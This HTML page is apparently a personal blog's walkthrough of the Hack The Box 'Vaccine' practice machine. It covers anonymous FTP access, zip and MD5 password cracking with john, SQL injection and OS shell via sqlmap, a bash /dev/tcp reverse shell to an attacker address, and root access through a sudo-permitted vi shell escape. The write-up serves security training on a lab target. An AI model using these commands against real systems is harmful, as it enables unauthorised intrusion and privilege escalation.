@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Vaccine Machine Notes | HTB Notes</title>
+<meta name="keywords" content="">
+<meta name="description" content="1. Nmap scanning
+Just as always: let&rsquo;s scan open ports using nmap:
+nmap 10.129.127.158 -sC -sV --open
+Findings
+
+Port 21 (FTP) is open, also it shows like there is a file named backup.zip on the server
+
+Port 22 (SSH) is open
+Port 80 (Apache http server) - let&rsquo;s access it on the web later
+
+2. Enumeration
+FTP Server
+Let&rsquo;s try log in ftp service without a password with username anonymous. It will as you for password, you can just hit ENTER.">
+<meta name="author" content="">
+<link rel="canonical" href="https://hoverdd.github.io/htb-notes/posts/vaccine/">
+<link crossorigin="anonymous" href="/htb-notes/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://hoverdd.github.io/htb-notes/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://hoverdd.github.io/htb-notes/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://hoverdd.github.io/htb-notes/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://hoverdd.github.io/htb-notes/apple-touch-icon.png">
+<link rel="mask-icon" href="https://hoverdd.github.io/htb-notes/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://hoverdd.github.io/htb-notes/posts/vaccine/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://hoverdd.github.io/htb-notes/posts/vaccine/">
+  <meta property="og:site_name" content="HTB Notes">
+  <meta property="og:title" content="Vaccine Machine Notes">
+  <meta property="og:description" content="1. Nmap scanning Just as always: let’s scan open ports using nmap:
+nmap 10.129.127.158 -sC -sV --open Findings Port 21 (FTP) is open, also it shows like there is a file named backup.zip on the server Port 22 (SSH) is open Port 80 (Apache http server) - let’s access it on the web later 2. Enumeration FTP Server Let’s try log in ftp service without a password with username anonymous. It will as you for password, you can just hit ENTER.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-09T18:58:45+03:00">
+    <meta property="article:modified_time" content="2025-07-09T18:58:45+03:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vaccine Machine Notes">
+<meta name="twitter:description" content="1. Nmap scanning
+Just as always: let&rsquo;s scan open ports using nmap:
+nmap 10.129.127.158 -sC -sV --open
+Findings
+
+Port 21 (FTP) is open, also it shows like there is a file named backup.zip on the server
+
+Port 22 (SSH) is open
+Port 80 (Apache http server) - let&rsquo;s access it on the web later
+
+2. Enumeration
+FTP Server
+Let&rsquo;s try log in ftp service without a password with username anonymous. It will as you for password, you can just hit ENTER.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://hoverdd.github.io/htb-notes/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Vaccine Machine Notes",
+      "item": "https://hoverdd.github.io/htb-notes/posts/vaccine/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Vaccine Machine Notes",
+  "name": "Vaccine Machine Notes",
+  "description": "1. Nmap scanning Just as always: let\u0026rsquo;s scan open ports using nmap:\nnmap 10.129.127.158 -sC -sV --open Findings Port 21 (FTP) is open, also it shows like there is a file named backup.zip on the server Port 22 (SSH) is open Port 80 (Apache http server) - let\u0026rsquo;s access it on the web later 2. Enumeration FTP Server Let\u0026rsquo;s try log in ftp service without a password with username anonymous. It will as you for password, you can just hit ENTER.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "1. Nmap scanning Just as always: let’s scan open ports using nmap:\nnmap 10.129.127.158 -sC -sV --open Findings Port 21 (FTP) is open, also it shows like there is a file named backup.zip on the server Port 22 (SSH) is open Port 80 (Apache http server) - let’s access it on the web later 2. Enumeration FTP Server Let’s try log in ftp service without a password with username anonymous. It will as you for password, you can just hit ENTER.\nSo let’s get this file, probably it has some files that we can search in. HTTP Server On port 80 we have a login form with two fields: username and password. Let’s try default credentials first like admin:admin just to see if it works. Nope it isn’t the case here.. let’s move on\nPassword Cracking Of course that archive is password protected. 🙄 Turns out (google helps 🙏) using zip2john we can grab hashes from this archive and then see the password with john tool.\nzip2john backup.zip \u003e hash Now we have hash file with hash in it: Let’s give it to john and see what he can do about it:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash Yep, john did it!! Password is 741852963 Now we can access the archive and see what’s inside of those files…\nunzip backup.zip Two files were extracted: index.php and style.css. I think there isn’t much useful in css file, so let’s see into index.php.\ncat index.php | grep -i passw* We found admin’s username and password. admin:2cb42f8734ea607eefed3b70af13bbd3. But we can’t just type in that password in web login form. Looking more closely at the code, we can see that before being compared password is being encrypted into MD5 hash. So maybe john can help us? Create a file with a hash in it:\necho \"2cb42f8734ea607eefed3b70af13bbd3\" \u003e hash.txt Found out that passing parameter --format=raw-md5 lets you find out what original value is stored there. Full command:\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt note: if you encounter a problem with john not showing you cracked passwords, just delete ~/.john/john.pot file. It is a temporary file john creates whilst cracking the hashes. Yay!! We got a password for login form and it’s qwerty789. Try to sign in.\n3. Exploitation SQL Injection We got access to /dashboard.php it displays some car catalogue. But where it takes it? Maybe database? Ok let’s play with search bar, type any car name, I will go with meta. And yes dashboard.php probably takes the data about cars from some db. Also we have this http request in the search bar: http://10.129.127.158/dashboard.php?search=Meta Do you think we can inject SQL there? I don’t know, let’s ask sqlmap! Sqlmap is a program that can automatically check if web application is vulnerable to SQL Injection. Let’s run it:\nsqlmap -u http://10.129.127.158dashboard.php?search=Meta -u flag specifies the hostname, also you need to add the parameters you think are vulnerable to SQLi We are being told by sqlmap that it can’t access /dashboard.php without logging in first. We’ve already logged in, so we can pass our cookie to sqlmap so it could use it to access the site. We can see the cookie in devtools. I use chromium so it’s in Application tab. To pass the cookie, simply add the flag --cookie=\"cookiename=value\"\nsqlmap -u http://10.129.127.158/dashboard.php?search=Meta --cookie=\"PHPSESSID=no0hjnver4jl9mop9lgc9qvv64\" Sqlmap even identified a database server as PostgreSQL. Nice. You can scroll sqlmap output and see that ?search= parameter is indeed vulnerable and injectable.\nGetting OS shell But let’s don’t go that far and get a shell on a db server. We can do that with --os-shell flag. Let’s try:\nsqlmap -u http://10.129.127.158/dashboard.php?search=Meta --cookie=\"PHPSESSID=no0hjnver4jl9mop9lgc9qvv64\" --os-shell As you can see we got shell! But it’s very unstable and it can be terminated any minute, let’s try get there a reverse shell. Create netcat listener:\nnc -lvnp 4444 Run this script in sqlmap shell:\nbash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.123/4444 0\u003e\u00261' Yep we got our reverse shell now. We can find user flag in /var/lib/postgresql folder: We didn’t see the contents of dashboard.php, maybe it has some interesting info too? Let’s go to /var/www/html. Before that if you use tmux you should upgrade your TTY to fully interactive one:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\") export TERM=xterm CTRL+Z stty raw -echo; fg ENTER When we see the dashboard.php: we notice $conn variable that initializes a connection with database and passes it all the info. We need only the password. It’s P@s5w0rd!. Ok, that’s nice, how can we get a root flag? Oh… and as I was writing it, our shell got terminated. It’s still unstable because it runs from postgres server. Remember that we also have ssh on port 22? Let’s use it and connect as postgres user since we have his password:\nssh postgres@10.129.127.158 We successfully connected to ssh server. Now Let’s think about how we can escalate priveleges to root.\n4. Pivelege Escalation First things first, we need to run sudo -l and see what programs postgres user can run with root rights. postgres can run\n/bin/vi /etc/postgresql/11/main/pg_hba.conf But how terminal-based text editor will help us with PrivEsc???? Let’s ask GTFOBin. It has a list of Unix binaries that can be used to bypass local security resrtictions (it will help us with PrivEsc ☺️) From GTFOBin: We need open that file using sudo permissions:\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf Now we can spawn a root shell:\n:set shell=/bin/sh :shell Press ENTER and tadaaa we’ve got a root shell. Root flag is in /root/root.txt I liked this machine! I got it almost without the writeup because I forgot about GTFOBins, it’s very useful resource! Thank you for reading!!!!! 😉\n",
+  "wordCount" : "927",
+  "inLanguage": "en",
+  "datePublished": "2025-07-09T18:58:45+03:00",
+  "dateModified": "2025-07-09T18:58:45+03:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hoverdd.github.io/htb-notes/posts/vaccine/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "HTB Notes",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hoverdd.github.io/htb-notes/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://hoverdd.github.io/htb-notes/" accesskey="h" title="HTB Notes (Alt + H)">HTB Notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://hoverdd.github.io/htb-notes/about/" title="About me">
+                    <span>About me</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vaccine Machine Notes
+    </h1>
+    <div class="post-meta"><span title='2025-07-09 18:58:45 +0300 MSK'>July 9, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="1-nmap-scanning">1. Nmap scanning<a hidden class="anchor" aria-hidden="true" href="#1-nmap-scanning">#</a></h2>
+<p>Just as always: let&rsquo;s scan open ports using nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 10.129.127.158 -sC -sV --open
+</span></span></code></pre></div><h3 id="findings">Findings<a hidden class="anchor" aria-hidden="true" href="#findings">#</a></h3>
+<ul>
+<li>Port 21 (FTP) is open, also it shows like there is a file named <code>backup.zip</code> on the server
+<img alt="backup.zip on FTP server" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.00.50%E2%80%AFPM.png"></li>
+<li>Port 22 (SSH) is open</li>
+<li>Port 80 (Apache http server) - let&rsquo;s access it on the web later</li>
+</ul>
+<h2 id="2-enumeration">2. Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-enumeration">#</a></h2>
+<h3 id="ftp-server">FTP Server<a hidden class="anchor" aria-hidden="true" href="#ftp-server">#</a></h3>
+<p>Let&rsquo;s try log in <code>ftp</code> service without a password with username <code>anonymous</code>. It will as you for password, you can just hit ENTER.</p>
+<p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.05.57%E2%80%AFPM.png"></p>
+<p>So let&rsquo;s get this file, probably it has some files that we can search in.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.07.15%E2%80%AFPM.png"></p>
+<h3 id="http-server">HTTP Server<a hidden class="anchor" aria-hidden="true" href="#http-server">#</a></h3>
+<p>On port 80 we have a login form with two fields: username and password.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.24.59%E2%80%AFPM.png">
+Let&rsquo;s try default credentials first like <code>admin:admin</code> just to see if it works.
+Nope it isn&rsquo;t the case here.. let&rsquo;s move on</p>
+<h3 id="password-cracking">Password Cracking<a hidden class="anchor" aria-hidden="true" href="#password-cracking">#</a></h3>
+<p>Of course that archive is password protected. 🙄
+Turns out (google helps 🙏) using <code>zip2john</code> we can grab hashes from this archive and then see the password with <code>john</code> tool.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john backup.zip &gt; hash
+</span></span></code></pre></div><p>Now we have <code>hash</code> file with hash in it:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.16.18%E2%80%AFPM.png"></p>
+<p>Let&rsquo;s give it to <code>john</code> and see what he can do about it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.18.32%E2%80%AFPM.png">
+Yep, <code>john</code> did it!! Password is <code>741852963</code>
+Now we can access the archive and see what&rsquo;s inside of those files&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip backup.zip
+</span></span></code></pre></div><p>Two files were extracted: <code>index.php</code> and <code>style.css</code>. I think there isn&rsquo;t much useful in css file, so let&rsquo;s see into <code>index.php</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat index.php | grep -i passw*
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.21.58%E2%80%AFPM.png">
+We found admin&rsquo;s username and password. <code>admin:2cb42f8734ea607eefed3b70af13bbd3</code>. But we can&rsquo;t just type in that password in web login form. Looking more closely at the code, we can see that before being compared password is being encrypted into MD5 hash. So maybe <code>john</code> can help us?
+Create a file with a hash in it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span> &gt; hash.txt
+</span></span></code></pre></div><p>Found out that passing parameter <code>--format=raw-md5</code> lets you find out what original value is stored there.
+Full command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>raw-md5 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.33.09%E2%80%AFPM.png">
+<em>note</em>: if you encounter a problem with <code>john</code> not showing you cracked passwords, just <strong>delete</strong> <code>~/.john/john.pot</code> file. It is a temporary file <code>john</code> creates whilst cracking the hashes.
+Yay!! We got a password for login form and it&rsquo;s <code>qwerty789</code>.
+Try to sign in.</p>
+<h2 id="3-exploitation">3. Exploitation<a hidden class="anchor" aria-hidden="true" href="#3-exploitation">#</a></h2>
+<h3 id="sql-injection">SQL Injection<a hidden class="anchor" aria-hidden="true" href="#sql-injection">#</a></h3>
+<p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.38.23%E2%80%AFPM.png">
+We got access to <code>/dashboard.php</code> it displays some car catalogue. But where it takes it? Maybe database? Ok let&rsquo;s play with search bar, type any car name, I will go with <code>meta</code>.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.40.37%E2%80%AFPM.png">
+And yes <code>dashboard.php</code> probably takes the data about cars from some db. Also we have this http request in the search bar:
+<code>http://10.129.127.158/dashboard.php?search=Meta</code>
+Do you think we can inject SQL there? I don&rsquo;t know, let&rsquo;s ask <code>sqlmap</code>!
+Sqlmap is a program that can automatically check if web application is vulnerable to SQL Injection. Let&rsquo;s run it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u http://10.129.127.158dashboard.php?search<span style="color:#f92672">=</span>Meta
+</span></span></code></pre></div><p><code>-u</code> flag specifies the hostname, also you need to add the parameters you think are vulnerable to SQLi
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.47.04%E2%80%AFPM.png">
+We are being told by <code>sqlmap</code> that it can&rsquo;t access <code>/dashboard.php</code> without logging in first. We&rsquo;ve already logged in, so we can pass our cookie to <code>sqlmap</code> so it could use it to access the site.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.50.31%E2%80%AFPM.png">
+We can see the cookie in devtools. I use <code>chromium</code> so it&rsquo;s in <code>Application</code> tab.
+To pass the cookie, simply add the flag <code>--cookie=&quot;cookiename=value&quot;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u http://10.129.127.158/dashboard.php?search<span style="color:#f92672">=</span>Meta --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PHPSESSID=no0hjnver4jl9mop9lgc9qvv64&#34;</span>
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%205.53.06%E2%80%AFPM.png">
+Sqlmap even identified a database server as PostgreSQL. Nice.
+You can scroll <code>sqlmap</code> output and see that <code>?search=</code> parameter is indeed vulnerable and injectable.</p>
+<h3 id="getting-os-shell">Getting OS shell<a hidden class="anchor" aria-hidden="true" href="#getting-os-shell">#</a></h3>
+<p>But let&rsquo;s don&rsquo;t go that far and get a shell on a db server. We can do that with <code>--os-shell</code> flag.
+Let&rsquo;s try:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u http://10.129.127.158/dashboard.php?search<span style="color:#f92672">=</span>Meta --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PHPSESSID=no0hjnver4jl9mop9lgc9qvv64&#34;</span> --os-shell
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.00.34%E2%80%AFPM.png">
+As you can see we got shell! But it&rsquo;s very unstable and it can be terminated any minute, let&rsquo;s try get there a reverse shell.
+Create netcat listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Run this script in sqlmap shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.123/4444 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.03.03%E2%80%AFPM.png">
+Yep we got our reverse shell now.
+We can find user flag in <code>/var/lib/postgresql</code> folder:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.04.51%E2%80%AFPM.png">
+We didn&rsquo;t see the contents of <code>dashboard.php</code>, maybe it has some interesting info too? Let&rsquo;s go to <code>/var/www/html</code>. Before that if you use tmux you should upgrade your TTY to fully interactive one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#960050;background-color:#1e0010">&#39;</span>import pty;pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>CTRL+Z
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>ENTER
+</span></span></code></pre></div><p>When we see the <code>dashboard.php</code>:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.10.21%E2%80%AFPM.png">
+we notice <code>$conn</code> variable that initializes a connection with database and passes it all the info. We need only the password. It&rsquo;s <code>P@s5w0rd!</code>.
+Ok, that&rsquo;s nice, how can we get a root flag?
+Oh&hellip; and as I was writing it, our shell got terminated.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.13.53%E2%80%AFPM.png"></p>
+<p>It&rsquo;s still unstable because it runs from postgres server. Remember that we also have ssh on port 22? Let&rsquo;s use it and connect as <code>postgres</code> user since we have his password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh postgres@10.129.127.158
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.15.51%E2%80%AFPM.png">
+We successfully connected to ssh server. Now Let&rsquo;s think about how we can escalate priveleges to root.</p>
+<h2 id="4-pivelege-escalation">4. Pivelege Escalation<a hidden class="anchor" aria-hidden="true" href="#4-pivelege-escalation">#</a></h2>
+<p>First things first, we need to run <code>sudo -l</code> and see what programs <code>postgres</code> user can run with root rights.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.19.53%E2%80%AFPM.png">
+<code>postgres</code> can run</p>
+<pre tabindex="0"><code>/bin/vi /etc/postgresql/11/main/pg_hba.conf
+</code></pre><p>But how terminal-based text editor will help us with PrivEsc???? Let&rsquo;s ask <a href="https://gtfobins.github.io/">GTFOBin</a>. It has a list of Unix binaries that can be used to bypass local security resrtictions (it will help us with PrivEsc ☺️)
+From GTFOBin:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.24.04%E2%80%AFPM.png">
+We need open that file using sudo permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</span></span></code></pre></div><p>Now we can spawn a root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>:set shell<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>:shell 
+</span></span></code></pre></div><p>Press ENTER and tadaaa we&rsquo;ve got a root shell.
+Root flag is in <code>/root/root.txt</code>
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/vaccine/screenshots/Screenshot%202025-07-09%20at%206.33.14%E2%80%AFPM.png">
+I liked this machine! I got it almost without the writeup because I forgot about GTFOBins, it&rsquo;s very useful resource! Thank you for reading!!!!! 😉</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://hoverdd.github.io/htb-notes/">HTB Notes</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
